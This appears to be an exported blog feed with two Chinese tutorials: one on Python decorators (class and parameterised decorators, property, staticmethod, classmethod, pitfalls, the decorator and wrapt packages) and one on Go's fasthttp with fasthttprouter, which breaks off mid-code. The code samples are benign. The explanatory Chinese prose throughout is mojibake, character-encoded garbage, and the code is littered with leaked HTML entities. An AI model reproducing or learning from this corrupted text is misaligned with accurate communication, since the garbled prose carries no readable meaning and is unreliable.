è£…é¥°å‡½æ•°å’Œç±»è¢«è£…é¥°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–æ˜¯ä¸€ä¸ªç±»ï¼Œå…¶å®žå¹¶æ²¡æœ‰æœ¬è´¨ä¸Šçš„å·®åˆ«ï¼Œå› æ­¤è¿™é‡Œåˆå¹¶ç»™å‡ºæ —å­ è£…é¥°å™¨æ— å‚æ•°1234567891011121314151617181920class debug(object): def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print("[DEBUG]: enter function &#123;func&#125;()".format(func=self.func.__name__)) return self.func(*args, **kwargs)@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") è£…é¥°å™¨æœ‰å‚æ•°1234567891011121314151617181920212223class debug(object): def __init__(self, level='INFO'): self._level = level def __call__(self, func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter function &#123;&#125;()".format(self._level ,func.__name__)) return func(*args, **kwargs) return wrapper@debug()class Hello(object): def __init__(self, name): self.name = name@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") å†…ç½®è£…é¥°å™¨å†…ç½®çš„è£…é¥°å™¨å’Œæ™®é€šçš„è£…é¥°å™¨åŽŸç†æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡è¿”å›žçš„ä¸æ˜¯å‡½æ•°ï¼Œè€Œæ˜¯ç±»å¯¹è±¡ï¼Œæ‰€ä»¥æ›´éš¾ç†è§£ä¸€äº› propertæˆ‘ä»¬å…ˆçœ‹çœ‹propertyåˆ°åº•æ˜¯å•¥,ä»¥ä¸‹æ˜¯propertyç±»çš„doc string123456789101112131415161718192021222324252627282930313233class property(object): """ property(fget=None, fset=None, fdel=None, doc=None) -&gt; property attribute fget is a function to be used for getting an attribute value, and likewise fset is a function for setting, and fdel a function for del'ing, an attribute. Typical use is to define a managed attribute x: class C(object): def getx(self): return self._x def setx(self, value): self._x = value def delx(self): del self._x x = property(getx, setx, delx, "I'm the 'x' property.") Decorators make defining new properties or modifying existing ones easy: class C(object): @property def x(self): "I am the 'x' property." return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x """ def __init__(self, fget=None, fset=None, fdel=None, doc=None): # known special case of property.__init__ pass ... å®žé™…ä¸Špropertyè£…é¥°å™¨å¸®æˆ‘ä»¬å®Œæˆäº†x = property(getx, setx, delx, &quot;I&#39;m the &#39;x&#39; property.&quot;)è¿™ä¸ªåŠ¨ä½œï¼Œè€Œä¸”è¿”å›žçš„æ˜¯ä¸€ä¸ªpropertyå¯¹è±¡ã€‚ staticmethodstaticmethodä¼ å…¥ä¸€ä¸ªå‡½æ•°è¿”å›žä¸€ä¸ªstaticmethodçš„å¯¹è±¡ã€‚123456789101112131415161718192021222324class staticmethod(object): """ staticmethod(function) -&gt; method Convert a function to be a static method. A static method does not receive an implicit first argument. To declare a static method, use this idiom: class C: def f(arg1, arg2, ...): ... f = staticmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. Static methods in Python are similar to those found in Java or C++. For a more advanced concept, see the classmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... classmethodåŒç†classmethodä¼ å…¥ä¸€ä¸ªå‡½æ•°è¿”å›žä¸€ä¸ªclassmethodå¯¹è±¡ã€‚123456789101112131415161718192021222324252627class classmethod(object): """ classmethod(function) -&gt; method Convert a function to be a class method. A class method receives the class as implicit first argument, just like an instance method receives the instance. To declare a class method, use this idiom: class C: def f(cls, arg1, arg2, ...): ... f = classmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. If a class method is called for a derived class, the derived class object is passed as the implied first argument. Class methods are different than C++ or Java static methods. If you want those, see the staticmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... éœ€è¦æ³¨æ„çš„é—®é¢˜è£…é¥°å™¨å¯ä»¥è®©ä½ ä»£ç æ›´åŠ ä¼˜é›…ï¼Œå‡å°‘é‡å¤ï¼Œä½†ä¹Ÿä¸å…¨æ˜¯ä¼˜ç‚¹ï¼Œä¹Ÿä¼šå¸¦æ¥ä¸€äº›é—®é¢˜ã€‚ ä½ç½®é”™è¯¯1234567891011121314151617181920212223def html_tags(tag_name): print('begin outer function.') def wrapper(func): print("begin of inner wrapper function.") def wrapper(*args, **kwargs): content = func(*args, **kwargs) print("&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;".format(tag=tag_name, content=content)) print('end of inner wrapper function.') return wrapper print('end of outer function') return wrapper@html_tags('b')def hello(name='Toby'): return 'Hello &#123;&#125;!'.format(name)hello()hello() åœ¨è£…é¥°å™¨ä¸­æˆ‘åœ¨å„ä¸ªå¯èƒ½çš„ä½ç½®éƒ½åŠ ä¸Šäº† print è¯­å¥ï¼Œç”¨äºŽè®°å½•è¢«è°ƒç”¨çš„æƒ…å†µã€‚ä½ çŸ¥é“ä»–ä»¬æœ€åŽæ‰“å°å‡ºæ¥çš„é¡ºåºå—ï¼Ÿå¦‚æžœä½ å¿ƒé‡Œæ²¡åº•ï¼Œé‚£ä¹ˆæœ€å¥½ä¸è¦åœ¨è£…é¥°å™¨å‡½æ•°ä¹‹å¤–æ·»åŠ é€»è¾‘åŠŸèƒ½ï¼Œå¦åˆ™è¿™ä¸ªè£…é¥°å™¨å°±ä¸å—ä½ æŽ§åˆ¶äº†1234567begin outer function.end of outer functionbegin of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function. å‡½æ•°ç­¾åå’Œæ–‡æ¡£ä½¿ç”¨è£…é¥°å™¨åŽå®žé™…ä¸Šå‡½æ•°çš„å‰é¢å’Œæ–‡æ¡£éƒ½ä¼šè¢«æ›¿æ¢æˆwrapperçš„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥ç®€å•å¤„ç†è¿‡æ¥,ä½†æ˜¯è¿™å¹¶ä¸æ˜¯å®Œç¾Žçš„è§£å†³ä¹‹é“123456789101112131415161718192021222324252627282930import inspectdef debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob")print(Hello.__name__)print(hello.__name__)print(inspect.getsource(Hello))print(inspect.getsource(hello)) staticmethodå’Œclassmethodä¸èƒ½å†æ¬¡è£…é¥°å½“ä½ æƒ³æŠŠè£…é¥°å™¨ç”¨åœ¨ä¸€ä¸ªé™æ€æ–¹æ³•æˆ–è€…ç±»æ–¹æ³•æ—¶ï¼Œä¸å¥½æ„æ€ï¼ŒæŠ¥é”™äº†ã€‚12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug # è£…é¥°å®žä¾‹æ–¹æ³•ï¼ŒOK def run(self): print("&#123;&#125; is running!".format(self.model)) @debug # è£…é¥°é™æ€æ–¹æ³•ï¼ŒFailed @staticmethod def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) å‰é¢å·²ç»è§£é‡Šäº†@staticmethodè¿™ä¸ªè£…é¥°å™¨ï¼Œå…¶å®žå®ƒè¿”å›žçš„å¹¶ä¸æ˜¯ä¸€ä¸ªcallableå¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ªstaticmethodå¯¹è±¡ï¼Œé‚£ä¹ˆå®ƒæ˜¯ä¸ç¬¦åˆè£…é¥°å™¨è¦æ±‚çš„ï¼ˆæ¯”å¦‚ä¼ å…¥ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œä½ è‡ªç„¶ä¸èƒ½åœ¨å®ƒä¹‹ä¸Šå†åŠ åˆ«çš„è£…é¥°å™¨ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜å¾ˆç®€å•ï¼Œåªè¦æŠŠä½ çš„è£…é¥°å™¨æ”¾åœ¨@staticmethodä¹‹å‰å°±å¥½äº†ï¼Œå› ä¸ºä½ çš„è£…é¥°å™¨è¿”å›žçš„è¿˜æ˜¯ä¸€ä¸ªæ­£å¸¸çš„å‡½æ•°ï¼Œç„¶åŽå†åŠ ä¸Šä¸€ä¸ª@staticmethodæ˜¯ä¸ä¼šå‡ºé—®é¢˜çš„ã€‚12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug() # è£…é¥°å®žä¾‹æ–¹æ³•ï¼ŒOK def run(self): print("&#123;&#125; is running!".format(self.model)) @staticmethod @debug() # é™æ€è£…é¥°å™¨æ”¾åˆ°æœ€åŽå°±okäº† def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) åˆ©ç”¨ç¬¬ä¸‰æ–¹åº“æ¥å†™è£…é¥°å™¨åµŒå¥—çš„è£…é¥°å‡½æ•°ä¸å¤ªç›´è§‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹åŒ…ç±»æ”¹è¿›è¿™æ ·çš„æƒ…å†µï¼Œè®©è£…é¥°å™¨å‡½æ•°å¯è¯»æ€§æ›´å¥½ã€‚ decoratordecorator.pyæ˜¯ä¸€ä¸ªéžå¸¸ç®€å•çš„è£…é¥°å™¨åŠ å¼ºåŒ…ã€‚ä½ å¯ä»¥å¾ˆç›´è§‚çš„å…ˆå®šä¹‰åŒ…è£…å‡½æ•°wrapper() ï¼Œå†ä½¿ç”¨decorate(func, wrapper)æ–¹æ³•å°±å¯ä»¥å®Œæˆä¸€ä¸ªè£…é¥°å™¨ã€‚1234567891011121314151617181920@decoratordef debug(func, *args, **kwargs): print("[DEBUG] &#123;&#125;: enter &#123;&#125;()".format(datetime.now(), func.__name__)) return func(*args, **kwargs)@debugdef hello(name): """test""" print("hello %s" % name)@debugclass Hello(object): def __init__(self, name): self.name = namehello("Bob")print(inspect.getsource(hello))print(hello.__name__) decoratoræ¯”è¾ƒç®€é™‹, è¦è£…é¥°ç±»å’Œå¸¦å‚æ•°çš„è£…é¥°å°±ä¸èƒ½å¾ˆå¥½æ”¯æŒäº†ã€‚ wraptwraptæ˜¯ä¸€ä¸ªåŠŸèƒ½éžå¸¸å®Œå–„çš„åŒ…ï¼Œç”¨äºŽå®žçŽ°å„ç§ä½ æƒ³åˆ°æˆ–è€…ä½ æ²¡æƒ³åˆ°çš„è£…é¥°å™¨ã€‚ä½¿ç”¨ wrapt å®žçŽ°çš„è£…é¥°å™¨ä½ ä¸éœ€è¦æ‹…å¿ƒä¹‹å‰ inspect ä¸­é‡åˆ°çš„æ‰€æœ‰é—®é¢˜ï¼Œå› ä¸ºå®ƒéƒ½å¸®ä½ å¤„ç†äº†ï¼Œç”šè‡³ inspect.getsource ( func ) ä¹Ÿå‡†ç¡®æ— è¯¯æ›´å…¨é¢çš„æ–‡æ¡£å¯ä»¥å‚è€ƒwraptå®˜æ–¹æ–‡æ¡£123456789101112131415161718192021222324252627282930313233343536373839404142434445from datetime import datetimeimport wraptdef debug(level='INFO'): @wrapt.decorator def wrapper(wrapped, instance, args, kwargs): print("[&#123;&#125;]: &#123;&#125; message".format(level, datetime.now())) return wrapped(*args, **kwargs) return wrapperclass Class(object): @debug() def function_im(self, arg1, arg2): pass @debug("DEBUG") @classmethod def function_cm(cls, arg1, arg2): pass @debug("ERROR") @staticmethod def function_sm(arg1, arg2): pass@debug()class Hello(): def __init__(self, name): self.name = name@debug()def hello(name): print("hello %s" % name)c = Class()c.function_im(1, 2)Class.function_im(c, 1, 2)Class.function_cm(1, 2)Class.function_sm(1, 2)h = Hello("Bob")hello("Bob") æ€»ç»“è£…é¥°å™¨çš„ç†å¿µæ˜¯å¯¹åŽŸå‡½æ•°ã€å¯¹è±¡çš„åŠ å¼ºï¼Œç›¸å½“äºŽé‡æ–°å°è£…ï¼Œæ‰€ä»¥ä¸€èˆ¬è£…é¥°å™¨å‡½æ•°éƒ½è¢«å‘½åä¸ºwrapper() ï¼Œæ„ä¹‰åœ¨äºŽåŒ…è£…ã€‚å‡½æ•°åªæœ‰åœ¨è¢«è°ƒç”¨æ—¶æ‰ä¼šå‘æŒ¥å…¶ä½œç”¨ã€‚æ¯”å¦‚@debug è£…é¥°å™¨å¯ä»¥åœ¨å‡½æ•°æ‰§è¡Œæ—¶é¢å¤–è¾“å‡ºæ—¥å¿—ï¼Œ @cacheè£…é¥°è¿‡çš„å‡½æ•°å¯ä»¥ç¼“å­˜è®¡ç®—ç»“æžœç­‰ç­‰ã€‚æœ€åŽé¿å…é‡å¤é€ è½®å­æŽ¨èä½¿ç”¨wraptï¼Œé™¤éžwraptçœŸä¸èƒ½æ»¡è¶³ä½ çš„ç‰¹æ€§éœ€æ±‚ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>deractor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é«˜æ€§èƒ½webä¹‹fasthttp]]></title>
    <url>%2F2017%2F01%2F25%2Ffasthttp%2F</url>
    <content type="text"><![CDATA[æµè§ˆç½‘ä¸Šåšå®¢æ—¶å‘çŽ°äº†è¿™ä¹ˆä¸€ç¯‡æµ‹è¯•æ–‡ç« nginx vs iris, ç»“æžœæ˜¯irisè¶Šèƒœä¸€ç­¹, è€ŒIrisåº•å±‚ä½¿ç”¨çš„å¹¶ä¸æ˜¯Golangçš„HTTPçš„æ ‡å‡†åº“, è€Œæ˜¯ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“fasthttp, ä¹‹å‰è¯»è¿‡ä¸€ç‚¹å…³äºŽgolangçš„net/http, åœ¨å¤„ç†ç”¨æˆ·çš„è¯·æ±‚æ—¶çš„ç¡®æœ‰ç‚¹ç²—æš´, ç›´æŽ¥ä¸€ä¸ªè¿žæŽ¥ä¸€ä¸ªgoroutine, å®Œå…¨æ²¡æœ‰å¹¶å‘çš„æŽ§åˆ¶ã€‚æŒ‰æºä¸åšå†…å¿ƒçš„å¥½å¥‡, æƒ³æ„Ÿå—ä¸€æŠŠfasthttp, æ¥ä¸€èµ·èµ°è¿›fasthttpçš„ä¸–ç•Œçœ‹çœ‹ã€‚ Benchmarkçš„çš„èƒœå‡ºgithubä¸Šé¢æœ‰ä¸€ä¸ªå¥½äº‹è€…å†™äº†ä¸€ä¸ªGo Webæ¡†æž¶æ€§èƒ½çš„åŽ‹æµ‹å·¥å…·, ç»“æžœæ˜¯fasthttpè¡¨çŽ°éžå¸¸ä¼˜å¼‚, å…·ä½“è¯·æŸ¥çœ‹go-web-framework-benchmark githubåœ°å€è¯·å…è®¸æˆ‘è´´ä¸€å¼ ä»–çš„å›¾ ç®€ä»‹fasthttpæ˜¯Goçš„HTTPçš„ç¬¬ä¸‰æ–¹å®žçŽ°, å®ƒå®£ç§°æ¯”æ ‡å‡†åº“net/httpå¿«10å€, æ˜¯ä¸€æ¬¾é«˜æ€§èƒ½çš„HTTPå®žçŽ°ã€‚Githubä¸­çš„Fasthttp best practicesè¿™æ®µæè¿°äº†å®ƒä¸ºå•¥é«˜æ€§èƒ½çš„åŽŸå›  net/http çš„å®žçŽ°æ˜¯ä¸€ä¸ªè¿žæŽ¥æ–°å»ºä¸€ä¸ª goroutine; fasthttpæ˜¯åˆ©ç”¨ä¸€ä¸ª worker å¤ç”¨ goroutineï¼Œå‡è½» runtime è°ƒåº¦ goroutine çš„åŽ‹åŠ› net/http è§£æžçš„è¯·æ±‚æ•°æ®å¾ˆå¤šæ”¾åœ¨ map[string]string (http.Header) æˆ– map[string][]string (http.Request.Form)ï¼Œæœ‰ä¸å¿…è¦çš„ []byte åˆ° string çš„è½¬æ¢ï¼Œæ˜¯å¯ä»¥è§„é¿çš„ net/http è§£æž HTTP è¯·æ±‚æ¯æ¬¡ç”Ÿæˆæ–°çš„ http.Request å’Œ http.ResponseWriter; fasthttpè§£æž HTTP æ•°æ®åˆ° fasthttp.RequestCtx ï¼Œç„¶åŽä½¿ç”¨ sync.Poolå¤ç”¨ç»“æž„å®žä¾‹ï¼Œå‡å°‘å¯¹è±¡çš„æ•°é‡ fasthttpä¼šå»¶è¿Ÿè§£æž HTTP è¯·æ±‚ä¸­çš„æ•°æ®ï¼Œå°¤å…¶æ˜¯ Body éƒ¨åˆ†ã€‚è¿™æ ·èŠ‚çœäº†å¾ˆå¤šä¸ç›´æŽ¥æ“ä½œ Body çš„æƒ…å†µçš„æ¶ˆè€— ä½†æ˜¯å› ä¸ºfasthttpçš„å®žçŽ°ä¸Žæ ‡å‡†åº“å·®è·è¾ƒå¤§ï¼Œæ‰€ä»¥APIçš„è®¾è®¡å®Œå…¨ä¸åŒ, å› æ­¤ä¹Ÿä¸å…¼å®¹æ ‡å‡†åº“net/httpã€‚ä½¿ç”¨æ—¶æ—¢éœ€è¦ç†è§£HTTPçš„å¤„ç†è¿‡ç¨‹ï¼Œåˆéœ€è¦æ³¨æ„å’Œæ ‡å‡†åº“çš„å·®åˆ«ã€‚ åŸºæœ¬ä½¿ç”¨åŸºæœ¬ç”¨æ³•å¾ˆç®€å•, 1. å†™å¥½handler 2. ç›‘å¬äº¤ç»™handlerå¤„ç†.12345678910111213141516171819package mainimport ( "fmt" "github.com/valyala/fasthttp")// ä½¿ç”¨RequestCtxä¼ é€’HTTPçš„æ•°æ®func httpHandler(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "hello fasthttp")&#125;// å¯åŠ¨æœåŠ¡æ—¶æŒ‡å®šå¤„ç†ä»»åŠ¡çš„handlerfunc main() &#123; if err := fasthttp.ListenAndServe("0.0.0.0:8080", httpHandler); err != nil &#123; fmt.Println("start fasthttp fail:", err.Error()) &#125;&#125; è·¯ç”±net/httpæä¾›http.ServeMuxå®žçŽ°è·¯ç”±æœåŠ¡ï¼Œä½†æ˜¯åŒ¹é…è§„åˆ™ç®€é™‹ï¼ŒåŠŸèƒ½å¾ˆç®€å•ï¼ŒåŸºæœ¬ä¸ä¼šä½¿ç”¨ã€‚ fasthttpå¸å–æ•™è®­ï¼Œé»˜è®¤æ²¡æœ‰æä¾›è·¯ç”±æ”¯æŒã€‚å®˜æ–¹æåˆ°äº†4ä¸ªè·¯ç”±å®žçŽ°: Iris, fasthttp-routing, fasthttproute, lu, ç¬¬ä¸€ä¸ªæ˜¯æ¡†æž¶, ç¬¬äºŒä¸‰ä¸ªæ˜¯å•çº¯çš„è·¯ç”±, ç¬¬4ä¸ªä¸çŸ¥é“ã€‚æˆ‘è¿™é‡Œé€‰æ‹©fasthttprouter, å› ä¸ºgithubä¸Šé¢è¿™ä¸ªé¡¹ç›®æ–‡æ¡£å’Œæ´»è·ƒåº¦æ¯”è¾ƒä¸é”™ å®‰è£…fasthttprouter12345678âžœ Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;github.com/buaazp/fasthttprouter (download)github.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)github.com/buaazp/fasthttprouter ç®€å•ä½¿ç”¨è¯¦å°½çš„ä½¿ç”¨è¿˜å¾—åŽ»çœ‹Githubæˆ–è€…æºç , è¯·å…è®¸æˆ‘è´´ä¸€æ®µå®˜æ–¹çš„ä»£ç , æˆ‘æœ¬åœ°ä¹Ÿç”¨ç€è¿™ä¸ªæµ‹12345678910111213141516171819202122232425package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Index(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "Welcome!\n")&#125;func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; è¯·æ±‚å’Œå“åº”åœ¨fasthttpä¸­ä½¿ç”¨ä¸€ä¸ªå¯¹è±¡æ¥ç»´æŠ¤è¯·æ±‚çš„ä¸Šä¸‹æ–‡:RequestCtx, å®ƒç»¼åˆäº†http.Requestå’Œhttp.ResponseWriterçš„æ“ä½œï¼Œå¯ä»¥æ›´æ–¹ä¾¿çš„è¯»å–å’Œè¿”å›žæ•°æ®, é€šè¿‡ä¸‹å›¾è¿™ç§å¯¹ç…§è¡¨æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹å‡ºæ¥12345678910111213141516171819202122232425262728293031r.Body -&gt; ctx.PostBody()r.URL.Path -&gt; ctx.Path()r.URL -&gt; ctx.URI()r.Method -&gt; ctx.Method()r.Header -&gt; ctx.Request.Headerr.Header.Get() -&gt; ctx.Request.Header.Peek()r.Host -&gt; ctx.Host()r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()r.PostForm -&gt; ctx.PostArgs()r.FormValue() -&gt; ctx.FormValue()r.FormFile() -&gt; ctx.FormFile()r.MultipartForm -&gt; ctx.MultipartForm()r.RemoteAddr -&gt; ctx.RemoteAddr()r.RequestURI -&gt; ctx.RequestURI()r.TLS -&gt; ctx.IsTLS()r.Cookie() -&gt; ctx.Request.Header.Cookie()r.Referer() -&gt; ctx.Referer()r.UserAgent() -&gt; ctx.UserAgent()w.Header() -&gt; ctx.Response.Headerw.Header().Set() -&gt; ctx.Response.Header.Set()w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()w.WriteHeader() -&gt; ctx.SetStatusCode()w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()http.Error() -&gt; ctx.Error()http.FileServer() -&gt; fasthttp.FSHandler(), fasthttp.FShttp.ServeFile() -&gt; fasthttp.ServeFile()http.Redirect() -&gt; ctx.Redirect()http.NotFound() -&gt; ctx.NotFound()http.StripPrefix() -&gt; fasthttp.PathRewriteFunc ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•ä¾‹å­ï¼Œåœ¨ä¸Šä¸‹æ–‡ä¸­èŽ·å–è¯·æ±‚æ•°æ®, é€šè¿‡WriteStringæ¥è¿”å›žå“åº”ã€‚1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.WriteString("hello,fasthttp") // å› ä¸ºå®žçŽ°ä¸åŒï¼Œfasthttp çš„è¿”å›žå†…å®¹ä¸æ˜¯å³åˆ»è¿”å›žçš„ // ä¸åŒäºŽæ ‡å‡†åº“ï¼Œæ·»åŠ è¿”å›žå†…å®¹åŽè®¾ç½®çŠ¶æ€ç ï¼Œä¹Ÿæ˜¯æœ‰æ•ˆçš„ ctx.SetStatusCode(404) // è¿”å›žçš„å†…å®¹ä¹Ÿæ˜¯å¯ä»¥èŽ·å–çš„ï¼Œä¸éœ€è¦æ ‡å‡†åº“çš„ç”¨æ³•ï¼Œéœ€è¦è‡ªå·±æ‰©å±• http.ResponseWriter fmt.Printf("Host: %s\n", ctx.Host()) fmt.Printf("Body: %s\n", ctx.Response.Body()) fmt.Printf("Path: %s\n", ctx.Path()) fmt.Printf("Method: %s\n", ctx.Method()) fmt.Printf("URI: %s\n", ctx.URI()) fmt.Printf("Connect Time: %s\n", ctx.ConnTime()) fmt.Printf("UserAgent: %s\n", ctx.UserAgent())&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; Bodyå¤„ç†fasthttp æä¾›æ¯”æ ‡å‡†åº“ä¸°å¯Œçš„ Body æ“ä½œ APIï¼Œè€Œä¸”æ”¯æŒè§£æž Gzip è¿‡çš„æ•°æ®, æˆ‘ä»¬å¯ä»¥ç®€å•çš„ä½¿ç”¨ä¸Šä¸‹æ–‡çš„PostBodyæ–¹æ³•èŽ·å–body1234567891011121314151617181920212223242526272829303132package mainimport ( "encoding/json" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; body := ctx.PostBody() // èŽ·å–åˆ°çš„æ˜¯ []byte fmt.Fprintf(ctx, "Body:%s", body) // å› ä¸ºæ˜¯ []byteï¼Œè§£æž JSON å¾ˆç®€å• var v interface&#123;&#125; json.Unmarshal(body, &amp;v) fmt.Printf("%v", v)&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; ç®€å•çš„æµ‹è¯•ç»“æžœ12âžœ Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125; è¡¨å•å¤„ç†RequestCtxæœ‰åŒæ ‡å‡†åº“çš„ FormValue() æ–¹æ³•ï¼Œè¿˜å¯¹ GET å’Œ POST/PUT ä¼ é€’çš„å‚æ•°è¿›è¡Œäº†åŒºåˆ†1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.SetContentType("text/html") // GET ?abc=abc&amp;abc=123 getValues := ctx.QueryArgs() fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", getValues.Peek("abc")) // Peek åªèŽ·å–ç¬¬ä¸€ä¸ªå€¼ fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", bytes.Join(getValues.PeekMulti("abc"), []byte(","))) // PeekMulti èŽ·å–æ‰€æœ‰å€¼ // POST xyz=xyz&amp;xyz=123 postValues := ctx.PostArgs() fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", postValues.Peek("xyz")) fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", bytes.Join(postValues.PeekMulti("xyz"), []byte(",")))&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; è¾“å‡ºç»“æžœ:1234GET abc=abc GET abc=abc,123 POST xyz=xyz POST xyz=xyz,123 æ–‡ä»¶å¤„ç†fasthttpæä¾›ååˆ†å‹å¥½çš„æŽ¥å£, é€šè¿‡FromFileè¯»æ–‡ä»¶ä¸Šä¼ , é€šè¿‡SendFileæ¥æä¾›ä¸‹è½½,ä½†æ˜¯å¦‚æžœä½ æƒ³æ›´åŠ æ–¹ä¾¿çš„å®šåˆ¶ä¸€äº›ä¿¡æ¯,æœ€å¥½ä½¿ç”¨MultipartFormæ¥èŽ·å–ä¸Šä¼ å¯¹è±¡1234567891011121314151617// MultipartForm returns requests's multipart form.//// Returns ErrNoMultipartForm if request's content-type// isn't 'multipart/form-data'.//// All uploaded temporary files are automatically deleted after// returning from RequestHandler. Either move or copy uploaded files// into new place if you want retaining them.//// Use SaveMultipartFile function for permanently saving uploaded file.//// The returned form is valid until returning from RequestHandler.//// See also FormFile and FormValue.func (ctx *RequestCtx) MultipartForm() (*multipart.Form, error) &#123; return ctx.Request.MultipartForm()&#125; MultipartForm è¿”å›žçš„æ˜¯ä¸€ä¸ªFormç»“æž„ä½“, æˆ‘ä»¬åœ¨ä»Žæºç ä¸­çœ‹çœ‹è¿™ä¸ªForm123456789// Form is a parsed multipart form.// Its File parts are stored either in memory or on disk,// and are accessible via the *FileHeader's Open method.// Its Value parts are stored as strings.// Both are keyed by field name.type Form struct &#123; Value map[string][]string File map[string][]*FileHeader&#125; æœ€å¥½æˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„åˆ†æžå®žçŽ°äº†ä¸€ä¸ªç®€å•çš„ä¸‹è½½å’Œä¸Šä¼ åŠŸèƒ½çš„å°Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package mainimport ( "fmt" "html/template" "io" "log" "strconv" "time" "crypto/md5" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")// Hello Handlerfunc Hello(ctx 